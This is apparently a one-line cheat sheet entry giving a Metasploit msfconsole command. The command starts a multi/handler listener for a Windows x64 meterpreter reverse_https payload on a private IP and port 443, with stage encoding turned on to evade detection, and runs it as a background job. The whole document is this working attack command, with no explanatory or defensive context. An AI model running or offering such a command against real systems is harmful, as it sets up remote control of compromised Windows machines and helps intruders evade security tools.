# One Liner

## msfconsole one liner

```text
sudo msfconsole -q -x "use multi/handler; set LHOST 10.110.0.66; set lport 443; set payload windows/x64/meterpreter/reverse_https; set StageEncoder x64/zutto_dekiru; set EnableStageEncoding true; exploit -j"
```

